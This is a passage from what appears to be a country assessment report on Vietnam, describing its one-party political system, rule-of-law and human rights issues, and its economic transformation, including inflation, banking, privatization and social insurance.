ahead of schedule, and appeared likely to complete all goals by 2015. The most decisive progress has been made in poverty reduction.
History and Characteristics of Transformation
After failed attempts at reform from 1979 to 1985, the VCP’s sixth party congress initiated the Doi Moi economic reform program. In doing so, the party conceded the failure of the centrally planned economy and paved the way for a market economy. However, economic reforms have been accompanied by only moderate structural changes to the political system, and no efforts to democratize have been made. To date there has been no indication of any move toward a multiparty system, and political reforms have focused largely on improving the rule of law, particularly on reducing the high level of corruption. While the government has scored a number of high-profile successes in its campaign to eliminate graft, these efforts are almost exclusively tied to its efforts to attract investment, and do not suggest a desire for grassroots political reform. The VCP has maintained its firm grip on power, rejecting domestic and international calls for political reform and pluralism according to international standards. The following description is therefore limited to the economic sector.
Initial reform measures, such as the significant reduction of internal trade barriers and steps toward liberalizing foreign trade, remained largely ineffective due to galloping, triple-digit inflation rates. Desired results came only after the role of agricultural cooperatives was reduced, planned-economy structures were entirely abolished, prices for most goods and services were allowed to float, and additional trade liberalization measures were implemented in 1988 and 1989. After this time, Vietnam rose to its current position as the second-largest rice exporter in the world and the world’s second-largest exporter of coffee beans.
In a matter of a few years, Vietnam abolished the neo-Stalinist centrally planned economy that was introduced in North Vietnam in 1954 and imposed on the former South Vietnam following reunification in 1975. Although state-owned enterprises continue to dominate key economic sectors, these firms operate on capitalist principles and compete with a growing number of private enterprises. However, Doi Moi has not proceeded without setbacks intensified by external factors. The major economic crisis of 1985, which included hyperinflation, famine and the exodus of refugees from Vietnam (the “boat people” crisis), was followed by the collapse of the Soviet Union in 1991, which meant the loss of the country’s most important trading partner and its primary donor of development and military assistance.
Thanks to a successful foreign policy focused on diversifying international relationships, the Vietnamese government was better able to absorb the economic and political aftermath of international structural changes than were other communist regimes. In the 1990s, Vietnam quintupled its number of active international relationships and joined the most important regional and global international organizations. In 1995, Vietnam scored a triple diplomatic success by joining ASEAN, establishing official relations with the United States and signing a framework cooperation agreement with the European Union, which contains a human rights clause and covers economic and trade relations. As part of its accession to ASEAN, Vietnam also became a member of the ASEAN Free Trade Area (AFTA).
Particularly important to the success of economic development was the normalization of relations with the United States, the lifting of the trade embargo in 1994 and the conclusion of a bilateral trade agreement in 2000. A framework cooperation agreement was signed between the European Commission and Vietnam in 1995. Vietnam’s accession to the World Trade Organization (WTO) in January 2007 marked another major success for the government’s internationalization strategy.
Since 1990, the Vietnamese economy has shown continual improvement. GDP has more than doubled in the last decade. In 2010 Vietnam reached a GDP per capita of $1,160 and attained “middle-income” status, according to World Bank criteria. The annual growth rate since 2000 has averaged 7.2%, second only to China in the Asia-Pacific region. International trade and inflows of foreign direct investment – mainly into export-oriented manufacturing – have been the main drivers of growth. Vietnam ranked third among Asian nations in terms of attracting investment in the 2007 – 2010 period, after China and India. Foreign direct investment (FDI) increased by an annual average of 16.6% between 2001 and 2008, though contracted by 13% in 2009 due to the effects of global economic crisis. However, investment recovered again in 2010.
In the same year, Vietnam had achieved five out of eight MDGs ahead of schedule, and is likely to complete all goals by 2015.
Despite the VCP’s commitment to economic reform and continual implementation of new reform measures such as improving investment conditions and reducing corruption, not all goals of economic transformation have been reached. Indeed, a large informal economy (for instance, uncontrolled border trade and smuggling) remains a significant constraint on the performance of the country’s market economic institutions. Mainly as the result of the 2008 – 2009 global economic crisis, but also due to shortcomings within domestic economic structures, Vietnam has been severely affected by rising inflation rates and downward pressure on the country’s currency, the dong. This has raised international concerns about the country’s economic stability. Since 2008, double-digit inflation has driven up the prices of food and basic commodities, and the country is suffering deficits in its trade and current accounts and its overall budget.
As Vietnam has opened its economy and integrated globally, the state – the executive and legislative branches – have become more powerful vis‐à‐vis the party apparatus. Although there are shortfalls in executing the separation of powers, three branches of government do exist today.
Transformation Status
I. Political Transformation
1 | Stateness
In the first few years after reunification, the state’s nationwide monopoly on the use of force was compromised by two factors: first, the ideological conflict that continued to exist between the North and South; and second, the minority problem, particularly the existence of ethnic enclaves in southern Vietnam. Since the dissolution of the United Front for the Liberation of Oppressed Races (Front unifié pour la libération des races opprimées, FULRO) in the late 1980s, there have been few problems with state identity. There are some exceptions to the above, as some South Vietnamese even three decades after reunification are reluctant to accept Hanoi as the seat of the state’s monopoly on the use of force. All citizens have the same rights, but discrimination against individual ethnic minorities still occurs due to faulty implementation of national equality laws at the local level.
The Vietnamese nation-state is the result of a long and painful anti-colonial and anti-imperialist struggle for independence. The communist revolution was the key to national liberation. As in China and Cuba, the VCP has indigenous roots. The party was not imposed on the country by the Red Army, but rather gained power through a war of national liberation. But unlike its Chinese counterpart, the VCP has not been discredited by turning on itself or turning the army against the people. National liberation, nation and communism are tightly intertwined, and provide the state with a high level of legitimacy. No relevant state or non-state actor questions the legitimacy of the nation-state or the concept of citizenship.
The commonly held assumption that there still exist discrete North Vietnamese and South Vietnamese national identities – supposedly strengthened by a concentration of political power in the North and entrepreneurial spirit in the South – is a myth. An overall Vietnamese identity has clearly emerged over the past two decades. The North-South divide has also been narrowed with the current government’s proactive policy toward the overseas Vietnamese who fled the country after 1975.
The political process is completely secularized, although Confucian teachings continue to be important as a framing principle of governmental organization. These teachings, however, are not part of a religious dogma in opposition to the state; rather, they form a basis for exercising power that enhances communist ideology philosophically and traditionally, and lends legitimacy to the exercise of authority.
The party-state apparatus is present all over the country, in the form of a tripartite government and administrative infrastructure. Despite efforts to decentralize, political decision-making takes place in Hanoi. This centralization of power brokering, combined with high levels of corruption, has hindered the implementation of many policies, particularly in the South and in Ho Chi Minh City. The administration and delivery of basic infrastructure has improved. For example, more than 90% of the majority Kinh population and 80% of the ethnic minority population resident in rural areas today live within two kilometers of an all-weather road (up from about 50% in 1998). This has considerably reduced the isolation of the rural population during wet seasons. Provision of healthcare in Vietnam has improved in terms of health indicators such as life expectancy and infant mortality, but the poor quality of health services in rural areas is reflected in WHO health equitability indexes, which ranked Vietnam 183rd out of 194 countries in 2009. Vietnam has made education a main priority since the 1970s. However, many districts lack adequate facilities and financial support.
2 | Political Participation
Although there are no elections that conform to democratic standards, local and national elections are held every five years. The political awareness of voters has increased. However, Vietnam continues to be a one-party state with power vested in the VCP, and some dialogue taking place within the legislative National Assembly (NA). The primary institutional structures of political power and governance have evolved since 1976. Government policy is set by the politburo, the VCP executive, but the National Assembly has taken an increasingly influential role in this process. The politburo is elected by the VCP Central Committee, which is in turn elected by party congresses that are held at intervals of roughly five years. The Central Committee party secretariat issues directives to party members and oversees government policy on a day-to-day basis. There is considerable overlap between party and government. The 11th Party Congress of the VCP, which took place in January 2011, confirmed the existing structures of political rule. The delegates pledged to maintain one-party rule and continue Vietnam’s market-led policies. At the same time, the congress evinced some changes in the direction of more openness within the party. Congress delegates no longer blindly approved everything the Politburo wanted. For example, delegates extended the list of candidates for the Party Standing Committee, with the result that some candidates endorsed by the Politburo failed to win election.
While decisions made by the politburo still have the power of law to a great extent, a more assertive National Assembly has emerged since 1996, particularly since the last elections; the pressure on the party and ministers to be more accountable is growing. The NA is a unicameral body with 493 members who are elected to five-year terms. The VCP maintains control of the electoral process. At the last elections, on 20 May 2007, as in previous ballots, the only party allowed to participate was the Vietnamese Fatherland Front (VFF), an umbrella party comprised of the VCP, mass organizations and affiliated groups, as well as some non-partisan candidates. Forty-two seats were won by non-party candidates within the VFF, and one seat is held by a self-nominated candidate. Women won 127 seats (25.7%), while 87 ethnic minority candidates were elected (17.6%). The assembly meets twice a year and has de jure control over legislation, planning and appointments, but in reality simply confirms the decisions made by party organs. Nevertheless, the NA is the only institution within the political system where political actors are able to voice disagreement directly and in a high-profile manner. The Vietnamese president is elected by the National Assembly to serve a five-year term.
While Vietnam’s political leaders are not selected through elections that fulfill minimum standards of free popular choice and fair process, governance follows a legal-bureaucratic approach (as opposed to despotic rule).
Article 69 of the Vietnamese constitution stipulates, “The citizen shall enjoy freedom of opinion and speech, freedom of the press, the right to be informed, and the right to assemble, form associations and hold demonstrations in accordance with the provisions of the law.” However, these provisions are rendered meaningless by regulations and directives that reduce the peaceful exercise of freedom of association and assembly. Decree 88 provides for strict government control of associations, which effectively serve as agencies of government ministries or the VCP. Vietnamese workers are forbidden from organizing unions independent of the government-controlled labor confederation. Decree 38 bans public gatherings in front of places where government, party or international conferences are held, and requires organizers of public gatherings to apply for and obtain advance government permission. During the assessment period, associational rights to policy and public advocacy were narrowed. For example, the most recent Decree 45 (2010) adds the proviso “at the request of state agencies” to the right of associations to “participate in programs, projects, studies and counseling, and critical comment and examination” (Art. 23(7)) in order to limit the scope of advocacy.
The constitutionally guaranteed freedom of expression, including the freedoms of press, speech, assembly, movement and association, remained severely restricted during the assessment period. U.S. Secretary of State Hillary Clinton highlighted freedom of expression as one of the issues discussed during the visit of Vietnam’s Deputy Prime Minister and Minister of Foreign Affairs Pham Gia Khiem to Washington in October 2009. Press freedom has increased to some extent, as demonstrated by frequent critical reporting on corruption cases.
The media has emerged as a key battleground between reformers and conservatives. While reformers do not necessarily support the concept of unrestricted press freedom, they do view a freer media as a potentially useful tool in policing corruption and thus in minimizing potential sources of popular discontent with party rule. Conservatives perceive even limited press freedom as a serious challenge to the VCP’s hegemony.
A decree signed by Prime Minister Nguyen Tan Dung in January 2011 tightened state control of the online media. The new restrictions seem to aim specifically at the country’s blogosphere, where many bloggers publish under pseudonyms to avoid possible government reprisals.
Furthermore, according to the Human Rights Watch World Report 2011, Vietnam has extended its extensive regime of media and Internet censorship with the use of an Internet firewall, and by implementing new, onerous and restrictive regulations requiring Internet companies and Internet cafe owners to monitor the online activity of Vietnamese citizens. The government is also said to have pressured Cambodia and Thailand “to crack down on peaceful anti-Vietnam government activities such as distributing leaflets and holding a news conference.” Hanoi rejected these allegations.
While the government controls the entire media, which consists of 600 newspapers and 100 radio and TV stations throughout Vietnam, its ability to control the Internet has predictably been very limited. Blogs have proliferated in Vietnam, though most are carefully apolitical. The first prominent exception was Bloc 8406, so named because the group was launched on 8 April 2006. Bloc 8406’s “Manifesto for Freedom and Democracy” called for the restoration of civil liberties, the establishment of opposition political parties, the drafting of a new constitution and democratic elections to the National Assembly. Bloc 8406 no longer exists, but the movement lives on under a variety of names.
3 | Rule of Law
Despite the paramount role of the Communist Party, the National Assembly has gained more prestige and power, as has the executive branch. As the result, the party’s interference in the working of the three branches has gradually decreased. In an attempt to introduce a system of checks and balances, at least on paper, a 2001 amendment to the 1992 constitution gave the National Assembly the right to make votes of no confidence on the governmental personnel it elects. However, the threat of this no-confidence vote is more theoretical than real, since the party controls the composition of the National Assembly through the Vietnam Fatherland Front. In addition, the state budget law of 2004 made the National Assembly responsible for the approval of the budget and for budgetary allocations to the lower government levels (see also Free and fair elections section).
In June 2010, for the first time in its history, the National Assembly opposed a major government spending initiative, blocking an ambitious high speed rail project in order to restrain government spending at a time when the state’s finances were coming under close scrutiny in financial markets. However, the legislature’s increasingly proactive approach has yet to be translated into support for pro-democracy reforms. Shortly before the closing of the fourth session in November 2008, the National Assembly rejected a trial plan that would have allowed direct local elections in April 2009. According to the proposal, which had been discussed by National Assembly members and outlined in a detailed assembly paper, citizens in 385 communes nationwide would have directly elected their people’s committee chairs. Comparisons were drawn with the village-level elections introduced by China. The National Assembly instead voted to extend until 2011 the terms of commune and district leaders who were indirectly elected in a process overseen by the VCP.
In 1982, at its fifth party congress, the VCP announced that it would reduce the overlap between party and state. Since that time, there has been some disentanglement, but the overlap persists. As Vietnam has opened its economy and integrated globally, the state – the cabinet and the Office of the Prime Minister – have become more powerful vis‐à‐vis the party apparatus, especially with respect to the Politburo.
The judiciary is clearly subject to the VCP. As Vietnam becomes increasingly integrated into international politics, its legal system has undergone some reforms. In general, however, the Vietnamese legal system does not conform to international standards. In addition, Vietnam’s legal system is insufficiently transparent, and lacks consistency, stability, and efficient implementation. Since the early 1990s, official development assistance (ODA) amounting to tens of millions of U.S. dollars has been made available for the support of Vietnam’s legal sector reform, and there was evidence of improvements to the legal system during the assessment period. The independence of the courts has been enhanced by replacing judicial elections with judicial appointments, thereby also strengthening criteria of judicial merit and expertise and by creating better material conditions for judges. The government is currently in the process of implementing two resolutions on legal matters – Resolution 48 (a strategy for development and improvement of the Vietnam legal system through 2010, with a vision through 2020) and Resolution 49 (judicial reform strategy) – which, inter alia, aim at the strengthening of judiciary independence. However, an April 2010 document on the formalization of coordination between the judiciary and the executive implicitly rejects the concept of judicial independence, and instead promotes strengthened collaboration between the two branches as imperative “to maintain good social order and law enforcement.”
Corruption and abuse of office remain among the VCP’s most serious problems. In line with frequent similar statements by high-ranking politicians, in his opening speech at the 11th Party Congress in January 2011, outgoing VCP General Secretary Nong Duc Manh addressed corruption and wastefulness as primary challenges to the state. Party leaders regularly acknowledge that corruption and the rampant abuse of power have held Vietnam back. Citizens’ complaints about official corruption, governmental inefficiency and opaque bureaucratic procedures are common. Between December 2008 and November 2009, 289 corruption cases were prosecuted, an increase of 2.48% year-on-year, according to the Central Steering Committee for Anti-Corruption.
Whereas the government’s attempts to punish corrupt officials indicate that the government takes graft seriously, they also underscore the pervasiveness of the problem. In December 2010, various foreign donors at the annual Consultative Group (CG) for Vietnam complained about the country’s lack of progress on fighting corruption. Among the most pressing problems is corruption in the area of land management. According to a recent survey conducted in Ho Chi Minh City and four provinces, 92% of respondents agreed that cases involving the illegal sale of land and illegal land allocation happened in every province.
The Vietnamese media has played a prominent role in exposing corruption scandals. Since the country lacks civil society groups able to act as watchdogs, the exposure of corruption and abuse of office has largely been in the hands of a small number of journalists who work for newspapers, such as Thanh Nien and Tuoi Tre, which are seen as progressive.
While maintaining the pace of economic liberalization, the government has continued to clamp down on oppositional civil society actors in an attempt to retain its monopoly on power. In trials throughout the assessment period, several Internet bloggers and human rights activists were accused of engaging in anti-government activities, such as “propaganda on the Internet,” and sentenced to prison terms. In 2010, at least 24 dissidents received prison sentences and 14 others were convicted. The string of political trials provoked strong international criticism, voiced by U.S. Secretary of State Hillary Clinton during her state visit to Vietnam in July 2010, the European Union, human rights organizations and others. The trials were seen as an attempt by the VCP to narrow the spectrum of anti-regime protest and pro-democracy activism in the run-up to the 11th Party Congress.
At the same time, the respect accorded to religious freedom and practice improved during the assessment period. The mass protests by members of the Catholic Church in 2008 and early 2009, which resulted in charges against several Vietnamese Catholics, eventually faded away. The protests erupted following the government seizure of land which belonged to the church, according to the protesters. Vietnamese have reported that their ability to gather and worship has generally improved, and that the government allowed registered religious groups to assign new clergy with only limited restrictions. The government also permitted the Buddhist, Catholic, Cao Dai, Hoa Hao, and Protestant faiths to hold several historic large-scale religious services throughout the country, some with over 100,000 participants.
Human rights remain a thorn in the side of Vietnam’s otherwise relatively smooth international relations. The U.S. State Department removed Vietnam from its “Countries of Particular Concern” list for violations of religious freedom in 2006. Since then, however, the United States and other nations, as well as the European Union, have criticized Vietnam’s human rights record. In late 2010, the U.S. ambassador to Vietnam said publicly that he was “troubled by the overall human rights problems in Vietnam.” In November of the same year, both chambers of the U.S. Congress introduced the Vietnam Human Rights Sanctions Act. The cosponsors pointed out that Vietnam was a source country for commercial sexual exploitation and forced labor, and a destination country for child trafficking. Meanwhile, in October 2010, Vietnam and the European Parliament (EP) held a first direct dialogue on human rights in Brussels.
4 | Stability of Democratic Institutions
There are no democratic institutions in Vietnam. All central political institutions are embedded in the state party system, which was stable during the assessment period and has thus far shown little potential for democratization.
Elections of people’s congress delegations at the county, municipal, provincial and national levels are not freely competitive, even where there are more candidates than seats. The political leadership and the party are very clear in their refusal of parliamentary democratic institutions. A societal pro-democracy movement has been growing over the past few years but the number of pro-democracy activists remains small. Despite its lack of democratic credentials, the current regime enjoys a high level of legitimacy within the vast majority of the population.
5 | Political and Social Integration
In accordance with the constitution, the VCP maintains a monopoly on the leadership of the state and society. The VCP has approximately 3 million members. All national associations and interest groups are encompassed within the Fatherland Front (VFF). The VFF is an umbrella organization grouping 29 registered mass organizations and special interest groups, of which the Vietnam Women’s Union is the largest, with a membership of 12 million and a staff of 300 across the country. Other mass organizations include the Ho Chi Minh Communist Youth Union and the Vietnam Youth Federation, respectively with 3.5 million and 2.5 million members. The leaders of these mass organizations regularly serve on the Party Central Committee.
Unlike in China, where the head of the party also assumes the position of the head of state, Vietnam has retained its “troika” structure: three different persons occupy the three posts of party chief, state president and head of government. Vietnam’s “troika” structure emerged after the death of Ho Chi Minh to reflect the more equal distribution of power among Ho’s successors.
Intermediary actors have been emerging since the early 1990s as a result of economic transformation and the societal and socioeconomic changes associated with it. The most prominent example of an organization established outside the confines of the VCP is the semi-governmental Vietnam Chamber of Commerce and Industry (VCCI). The VCCI comprises state-owned enterprises and private companies and trade associations in equal numbers. The VCCI is not directly funded by the state, but is a member of the VFF. Other semi-governmental groups such as the women’s union and peasant union have also gained in influence.
Most other interest groups work exclusively on a local level and are tolerated by the state as long as their activities are in harmony with the framework set out by the VCP. Interest groups in Vietnam are quickly developing greater capacity and assuming a broader role in relation to governance issues. In addition, there are of course the semi-governmental groups such as the women’s union and peasant union. Although these are not independent from the state and the party, they to some extent aggregate and articulate social interests and can influence politics (within the limits set by the political authorities).
Advocates of faster reform for Vietnam essentially view the years between the Ninth Party National Congress in 2001 and the 11th Congress in 2011 as lost time. In spite of impressive economic growth and government successes in reducing poverty, the reformers increasingly perceived the incremental and slow political changes as key impediments holding the country back, forcing it to trail faster-paced developments in China and elsewhere. While Vietnam has not shown any clear sign of political liberalization toward democracy, in 2007 the government for the first time opened the draft Political Report, a key comprehensive strategic document, to public debate over the Internet. Furthermore, party delegates to the congress were given the responsibility of nominating candidates for the Central Committee, opening the possibility of new faces in the Central Committee and the Politburo. In September 2010, key strategy papers being prepared for the party congress in January 2011 were publicized four months before the event (another first), allowing for public debate and increasing the degree of transparency in policy-making.
While a comparatively high 31% of Vietnamese believe they can trust others, the 82% of people who feel they have someone to rely on in times of need is below the global average. Charitable activity is limited: According to the 2009 Gallup World Poll, only 17% of people donate money to charity, and just 6% volunteered their time; both figures are in the world’s lowest quartile.
The government bans all independent political parties, unions and human rights organizations. However, during the assessment period, the government has become more tolerant of associational activities. Since mass organizations are included in the official definition of civil society, Vietnam appears to have solid foundations for social capital formation. Official figures show that among Vietnamese citizens, 74% are members of at least one organization; 62% are members of more than one civil society organization (CSO), and on average, each citizen is a member of 2.3 organizations. However, these figures serve primarily as evidence of state mobilization efforts. Furthermore, these figures as such do not provide any indication as to whether group membership produces the type of positive benefits associated with social capital in democracies or mainly contributes to the socialization of members into a set of values supportive of the existing regime. Recent studies on social capital formation in Vietnam suggest that social modernization in the wake of the economic reform process there has contributed to the gradual development of an independent civil society. Even within the state-mobilized mass organizations, increasing signs of independence and diversity of views have emerged. Furthermore, groups with greater autonomy from the state have been increasing in size and social impact. However, according to East Asian Barometer Survey data, Vietnam has the lowest level of voluntary social network involvement among the aforementioned Southeast Asian nations.
II. Economic Transformation
6 | Level of Socioeconomic Development
Vietnam remains a poor country. However, it has achieved many of the United Nations Millennium Development Goals, and is acknowledged by the UNDP as having one of the world’s fastest poverty reduction records. Indeed, poverty rates again decreased during the assessment period. The proportion of the population living below the national poverty line decreased from 37% in 2004 to 19.5% in 2007 and 14.8% in 2009. However, in its 2006 – 2010 Socioeconomic Development Plan, the government admits that the “rate of households re-falling under poverty lines remains high.” Furthermore, progress toward poverty alleviation has been uneven. Although economic reform has driven the process of poverty reduction, the scale and depth of ethnic minority poverty in Vietnam presents one of the major challenges to achieving the overall targets for poverty reduction set out in Millennium Development Goals. Over the past 15 years, poverty among the majority groups – the Kinh and Hoa – has declined much faster than among the 52 ethnic minorities.
Vietnam’s Human Development Index (HDI) value for 2010 was 0.572, placing it in the medium human development category. It was ranked 113th out of 169 countries and areas. Between 1990 and 2010, the country’s HDI value increased by 40%, or an annual average of about 1.7%. The new Gender Inequality Index (GII) ranks Vietnam 58th out of 138 countries, according to the 2010 Human Development Report. The GII value is 0.530.
7 | Organization of the Market and Competition
Since 1986, Vietnam has been slowly transforming into a market economy, and has experienced continual improvement in its economic foundations. Vietnam enjoyed a first surge in economic prosperity between 1989 and 1995, following the initiation of reform. In 1994, the National Assembly approved legislation on state enterprises and a labor law that gave workers some bargaining and strike rights. After 1997, a combination of the regional financial crisis, which severely depressed foreign investment, and long-standing constraints within the economy led to a deceleration in growth that lasted until 2000. The introduction of the new deregulatory Enterprise Law in 2000 was an important milestone in Vietnam’s development toward a market-based economy. The private sector was subsequently constitutionally granted the same status as the public sector, and party members were permitted to engage in private business, all of which precipitated a rapid expansion in the number of new businesses.
The role of the private sector in the Vietnamese economy has steadily grown. However, there are still several obstacles to private sector development. Discrimination in policy implementation with regard to credit, real estate and training results in discrepancies between private and public sector treatment. A long-standing internal VCP struggle, between reform-averse conservatives and a reformist camp that has pushed for further regulatory reform and the improvement of market transparency, intensified in the run-up to the 11th National Congress in January 2011. This prevailing political factionalism has clouded the future of pro-market reforms.
Even Prime Minister Nguyen Tan Dung, the leading public reformer figure, shifted his policy focus back in favor of large state-owned conglomerates. However, this approach backfired. In December 2010, after several months of uncertainty, Vinashin, a state-owned shipbuilder that had accumulated massive debts after an expansionary period, defaulted on the repayment of a $600 million foreign loan. This incident has become a symbol for the structural problems of the state-owned sector, and undermined Vietnam’s reputation as one of the most vibrant emerging economies. The generous government funding provided to inefficient state-owned enterprises lies at the core of Vietnam’s macroeconomic instability.
A law on competition went into effect on 1 July 2005. It applies to all business enterprises and professional and trade associations in Vietnam, overseas enterprises and associations registered in Vietnam, public utilities and state monopoly enterprises, and state administrative bodies. The competition law has supremacy over all other enacted laws in Vietnam regarding restrictive business practices and unfair trade practices. The law prohibits five broad types of anti-competitive practices: (1) competition restriction agreements; (2) abuse of dominant or monopoly position; (3) “concentrations of economic power” that substantially restrict competition; (4) acts of unhealthy competition; and (5) anticompetitive behavior and decisions by state agency officials in misuse of their position. While the adoption of the competition law has provided important tools to ensure a level playing field for all enterprises, the government still has a strong interest in retaining control over the economy as one of its key assets. In late 2007, the government listed 13 socioeconomic sectors in which state firms continue to enjoy a monopoly role, including, for example, the production and repair of weapons and equipment used in national defense and security; the national electricity transmission network and large-scale power generation; the production and import of tobacco products; the export of crude oil; postal services; the establishment of publishing houses and press agencies; and deposit insurance.
Between 2005 and 2010, the Vietnam Competition Authority (VCA) investigated 40 cases related to the violation of the competition law, all of which resulted in sanctions. Three of the 40 companies were involved in the abuse of monopoly, abuse of market dominance and anticompetitive agreements.
Vietnam has made impressive efforts to liberalize its foreign trade. The country has opened itself up rapidly to foreign influence since the 1980s, a process that has been accompanied by growing trade liberalization. This process has been marked by the following key events: ASEAN membership in 1995, APEC membership in 1998, the lifting of the U.S. trade embargo in 1994, and the conclusion of a bilateral trade agreement with the United States in 2000 that gave Vietnam most-favored-nation status. After long, complicated negotiations and delays, Vietnam joined the WTO as its 150th member on 11 January 2007. As a member of ASEAN, Vietnam became a member of the ASEAN Free Trade Zone (AFTA), leading to sharp reductions in tariffs on imports from Southeast Asian states. In addition, under the U.S. Bilateral Trade Agreement, which was signed in 2001, average tariffs on Vietnam’s exports to the United States were reduced from about 40% to between 3% and 4%, and Vietnam undertook significant commitments to reduce its own tariff and non-tariff trade barriers.
Prime Minister Nguyen Tan Dung has established strong pro-globalization credentials since taking office in 2006, masterminding several trade and investment liberalization policies. In 2008, Vietnam concluded a free trade agreement (FTA) with Japan; in March 2010, the European Union and Vietnam announced the start of free-trade negotiations
Since 1988, and especially since 1992, Vietnam has moved to a diversified system in which state-owned, joint-stock, joint-venture and foreign banks provide services to a broadening customer base. In 2009, the Vietnamese banking system comprised five state-owned commercial banks, one policy bank, five joint-venture banks, 39 foreign bank branches, 40 joint-stock commercial banks and 1016 local credit funds, supervised by the Central People’s Credit Fund. Since 2006, foreign banks have been allowed to offer a full range of banking services. One of the main challenges facing the government in recent years is the consolidation of the banking sector to ensure the presence of fewer and more stable banks. Among other structural weaknesses, Vietnam has one of the most cash-oriented economies in the region. In early 2010, Fitch Ratings expressed concerns about the sustainability of the domestic banking sector, focusing particularly on low-quality assets, limited capital and weak liquidity. In an effort to strengthen banks and encourage consolidation in the sector, the State Bank of Vietnam (SBV) raised the capital-adequacy ratio from 8% to 9% as of October 2010, and expressed an intention to raise the minimum capital requirement gradually between 2010 and 2015. A new June 2010 law strengthened the operational authority of the SBV, and placed greater emphasis on controlling inflation as the primary objective of monetary policy, substituting for the previous policy of promoting growth.
II. Market Economy
8 | Currency and Price Stability
Shocked by the hyperinflation of the mid-1980s, the government made fighting inflation one of its priorities, and was able to keep inflation at an average annual rate of approximately 3% between 1990 and 2004. However, inflation has reached much higher levels since 2004 due to higher food prices, the impact of rising international commodity prices, buoyant consumer demand, and more recently, the effects of the global economic crisis. In December 2010, the consumer price index rose by 11.8% year on year, the fastest rate of increase since February 2009.
The government has come under increasing international pressure to move away from its growth-oriented economic model and do more to tackle inflation “before rising prices and surging demand for U.S. dollars bring about a disorderly devaluation of the dong,” as the IMF and World Bank put it. Although Prime Minister Dung declared containing inflation to be Vietnam’s main policy goal for 2011, there are no clear signs yet that Hanoi is serious about adopting a rigorous approach. In recent years the government has effectively responded to the problem only when inflation reached a critical level. In mid-2010, more money was pumped into the financial system in order to help speed up lending growth and enable the broader economy to hit the government’s growth target. Furthermore, even the nominal commitment to fighting inflation in 2011 is less strong than it should be in the view of international observers. The inflation target rate for 2011 is 7%, unchanged from the 2010 target, while the government is still trying to achieve fast economic growth of 7% – 7.5% in 2011.
The national currency, the dong, is not convertible. The government adopted a plan to make the dong fully convertible by 2010, but was unable to achieve this goal. Growing concerns over the potential instability of Vietnam’s financial market, the global financial turbulence, and national economic performance have constrained the convertibility of the dong. More specifically, they have led the dong to depreciate and triggered a shortage of foreign exchange, constraining enterprises’ ability to meet payments in foreign currencies.
The central bank cut the dong’s value by 10% against the U.S. dollar between November 2009 and December 2010. The SBV announced it would follow a more flexible exchange-rate regime from 2011 on, while using monetary policy to curb inflation. According to this plan, the exchange rate will be based on market conditions and interest rates, and will be used to help boost exports and reduce imports. In late 2010, Vietnam foreign exchange reserves stood at $19.3 billion (down from $22 billion in 2008). More than 80% of these reserves are kept at central banks in the United States, France and Germany, or at the IMF and other international credit institutions, while the remainder is held in foreign commercial banks with ratings of AAA and AA. In March 2009, the SBV tightened control over the foreign exchange trading activities of domestic credit institutions. The State Bank of Vietnam is not independent from the government.
Vietnam’s economy grew at 6.8% in 2010 despite difficulties and challenges in the wake of the global economic crisis. All sectors and branches posted a growth rate higher than 2009, with agriculture, forestry and fisheries expanding by 2.8 %, industry and construction by 7.7%, and the service sector by 7.5%. Export earnings totaled $71.6 billion, representing a 25.5% increase as compared to 2009. Foreign direct investment (FDI) reached $11 billion in 2010 after a severe plunge the previous year. In line with international observers, the government has identified soaring inflation as the main threat to macroeconomic stability.
While Vietnam’s financial fundamentals have been relatively strong in comparison to other emerging markets over the past decade, some indicators worsened slightly during the assessment period. For example, total external debt fell from 35.2% to 30.5% of GDP between 2002 and 2008, but increased to 32.8% of GDP in 2009. However, Vietnam’s public debt is still at a manageable level, according to World Bank and IMF reports. Vietnam’s total public debt is estimated to have risen to 56.6% of GDP at the end of 2010, from 52.6% in late 2009.
The country’s debt repayment has been punctual since 1993. However, many state conglomerates are planning to issue bonds, which threatens to exacerbate the debt situation, as the debt of state-owned enterprises is not transparent. The insolvency of the state-run Vinashin company in 2010 – and the subsequent government bailout of the company – has highlighted these concerns. Furthermore, since Japan is one of the biggest creditors, the appreciating yen presents a risk to Vietnam’s ability to repay debts. Since the U.S. dollar is also appreciating against the dong, the need to buy dollars to buy yen for debt servicing could cause a double burden.
Until 2009, fiscal accounts were affected by low revenue growth, while expenditure levels remained high. As a result, the budget deficit (excluding on-lending) widened persistently from 1.9% in 2002 to 6.5% in 2009. In 2009, the government made extra funds available to boost economic growth during the global financial crisis, putting significant additional pressure on the budget. However, in 2010, the budget deficit decreased to 5.8% (less than the government’s original estimate of 6.2%) mainly due to state revenues that exceeded estimates by 9.3%, according to Ministry of Finance figures.
9 | Private Property
Property rights and the regulation of property acquisition are formally defined by law, but are not yet sufficiently protected from intervention by the state. As part of its bid to enter the WTO, Vietnam consolidated its confusing maze of intellectual property rules and regulations into a streamlined law that came into force in July 2006. The law covers copyright, industrial property and plant varieties. However, given the fast pace of change, it is difficult for the law enforcement agencies to keep up.
Private companies in 2010 contributed an estimated 29% of the state budget in the form of taxes, compared to 18% in 2006. The private sector contributes roughly 60% of the country’s GDP. Private enterprises created 4.3 million jobs, or 54% of all jobs, during the 2000 – 2008 period, four times more than state-owned businesses. However, the number of large private enterprises is still low due to a lack of capital and skilled workers. Private companies do not operate on a level playing field. Legislation and government policy still favors the state-owned sector. According to Le Dang Doanh, one of the architects of the Enterprise Law (2000), “We have changed our policies, but it is not enough. We need to renovate the institutional framework as well to support a market economy and ensure strong sources of finance. It’s a fact that 64% of enterprises can’t get loans from a bank. That means they can’t grow, and that’s no encouragement to families that set up businesses. To develop well, Vietnam needs to emphasize development of the banking sector. It is necessary to mobilize capital from the public and make that capital available to businesses.”
The pace of privatization (the Vietnamese term is “equitization”) was rapid in 1999 and 2000, but has slowed since then. The government had set a target to privatize 948 state-owned enterprises (SOE) between 2008 and 2010, including 65 large corporations with average capital of more than VND 1 trillion ($52.49 million. However, only 65 enterprises were privatized in 2009, compared to 349 in 2008. The process was similarly slow in 2010, prompting the Ministry of Finance to ask the government to extend deadlines for further privatization. The slow pace was blamed on the large size of the companies involved and the effects of the global economic crisis.
10 | Welfare Regime
Social security was recognized by the government as early as 1946, when the first constitution included the concept. Since 1975, social security policy has been uniformly implemented throughout the country.
Vietnam has a compulsory social insurance program that covers only labor in the formal sector (including the public administration, private companies, state-owned companies and foreign-owned companies). Consequently only 25% of the labor force of 44 million is covered by the scheme. Evasion and postponement of compulsory social insurance payments by both employees and employers is a serious problem, and the government has not found an effective approach to combating it. A new universal unemployment insurance scheme came into force in January 2009.
